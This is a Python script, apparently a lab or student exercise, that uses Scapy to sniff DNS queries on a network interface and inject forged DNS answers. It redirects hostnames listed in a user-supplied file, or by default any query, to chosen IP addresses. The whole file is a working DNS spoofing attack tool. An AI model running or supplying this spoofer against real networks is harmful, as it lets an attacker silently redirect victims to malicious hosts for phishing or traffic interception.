import argparse
import socket
from scapy.all import *

#gets the 2 arguments. returns nones if nothing is specified
def getArgs():
	parser = argparse.ArgumentParser(description= 'input -i yourInterface -h hostnamesFile',add_help=False)

	parser.add_argument('-i')	# to acess the argument its args.i
	parser.add_argument('-h')	# to acess this one its args.h
	args = parser.parse_args()

	return (args.i,args.h)

#determines what interface to use
def determineInterface(arg0):
	if arg0 != None:
		print("we got an interface")
		return arg0
	else:
		print("default interface: localhost")
		return "lo"
'''
determines what hostnames to look for
and use (in this case getting a file name
to read IP addresses and hostnames)
'''
def determineHostnames(args1):
	if args1 != None:
		#parse out the hostnames file
		return parseHostNameFile(args1)
	else:
		print("default is facebook")
		return {}


'''
parse out the hostnames file into a dictionary
'''
def parseHostNameFile(fileName):
	with open(fileName) as f:
		content = f.readlines()
	f.close()

	hostDict = {}
	for str in content:
		ip = str.split(',')[0]
		name = str.split(',')[1]
		if name[-1] == '\n':
			name = name[:-1]
		#print(ip,name)
		hostDict[name] = ip
	print(hostDict)
	return hostDict

def getQuestionPacket(packet: IP):
	if packet.haslayer(DNS):
#	  packet.show()
	  #check for the parts that indicate a query
	  if packet[DNS].ancount == 0 and packet[DNS].qr == 0 and packet[DNS].opcode == 0:
	    if(len(hostname) != 0):
	      #iterate through hostnames dictionry to see if a wanted hostname is found
	      for name in hostname:
	        #if in dictionary then change the answer (give different ip)
	        if name in str(packet[DNSQR].qname):
	          #packet.show()
	          ether = Ether(dst=packet[Ether].src,src=packet[Ether].dst)
	          ip = IP(dst=packet[IP].src,src=packet[IP].dst,id=RandShort())
	          udp = UDP(dport=packet[UDP].sport,sport=53)
	          dnsrr = DNSRR(rrname=name,ttl=100,rdata=hostname[name])
	          dns = DNS(id=packet[DNS].id,qr=1,ra=1,ancount=1,an=dnsrr)
	          newAnswer = ether/ip/udp/dns/dnsrr
	          #newAnswer = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,qr=1,ancount=1,an=DNSRR(rrname=packet[DNSQR].qname,rdata=hostname[name])/DNSRR(rrname=name,rdata=hostname[name]))
	          newAnswer.show()
	          print("NEW",newAnswer.summary())
	          sendp(newAnswer,verbose=0,iface=interface)
	    else:
	      ether = Ether(dst=packet[Ether].src,src=packet[Ether].dst)
	      ip = IP(dst=packet[IP].src,src=packet[IP].dst,id=RandShort())
	      udp = UDP(dport=packet[UDP].sport,sport=53)
	      dnsrr = DNSRR(rrname="www.facebook.com",ttl=100,rdata="157.240.18.35")
	      dns = DNS(id=packet[DNS].id,qr=1,ra=1,ancount=1,an=dnsrr)
	      newAns = ether/ip/udp/dns/dnsrr
	      newAns.show()
	      sendp(newAns,verbose=0,iface=interface)
	  else:
#	      send(packet,verbose=0,iface=interface)
	      print("REG PACKET",packet.summary())
	      packet.show()

#all functions are in here to run script as intended
if __name__ == "__main__":
	args = getArgs()
	#print(args[0],args[1])

	interface = determineInterface(args[0])
	hostname = determineHostnames(args[1])

	sniff(filter='udp dst port 53',prn=getQuestionPacket,iface=interface)
